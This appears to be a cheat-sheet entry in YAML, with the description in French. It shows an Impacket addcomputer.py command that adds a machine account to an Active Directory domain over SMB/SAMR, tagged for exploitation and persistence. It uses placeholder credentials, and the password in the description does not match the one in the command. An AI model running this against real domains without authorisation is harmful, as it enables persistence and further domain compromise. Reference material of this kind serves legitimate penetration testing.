---
description: |
  La commande addcomputer.py d'Impacket ajoutera un compte d'ordinateur au domaine et définira son mot de passe. La commande suivante crée un nouvel ordinateur via SMB en spécifiant la méthode `SAMR`.

  Command Reference:

  	Target IP: 10.10.10.1

  	Domain: test.local

  	New Computer Password: TestPassword123

  	New Computer Name: testComputer

  	Username: john

  	Password: password123

command: |
  python3 addcomputer.py -method SAMR -dc-ip 10.10.10.1 -computer-pass TestPassword321 -computer-name testComputer test.local/john:password123
items:
  - Username
  - Password
services:
  - SMB
OS:
  - Linux
  - Windows
  - Approved-tool
attack_types:
  - Exploitation
  - Persistence
references:
  - https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py
  - http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html
---
